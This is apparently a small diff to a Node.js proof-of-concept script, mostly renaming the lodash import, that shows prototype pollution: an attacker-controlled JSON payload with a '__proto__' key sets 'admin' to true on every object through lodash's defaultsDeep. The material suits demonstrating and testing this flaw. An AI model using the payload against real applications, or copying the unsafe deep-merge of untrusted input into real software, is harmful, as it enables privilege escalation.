@@ -6,14 +6,14 @@ GEREKLİ PAKETLER YÜKLENİYOR...
 var http = require('http');
 var express = require('express');
 var Prism = require('prismjs');
-const _ = require('lodash');
+var loadash = require('lodash');
 
 // Attacker-controlled input
 const maliciousPayload = JSON.parse('{ "__proto__": { "admin": true } }');
 
 let userSettings = {};
 
-_.defaultsDeep(userSettings, maliciousPayload);
+loadash.defaultsDeep(userSettings, maliciousPayload);
 
 // Checking if the payload polluted the prototype
 console.log({}.admin); // true — prototype has been polluted!
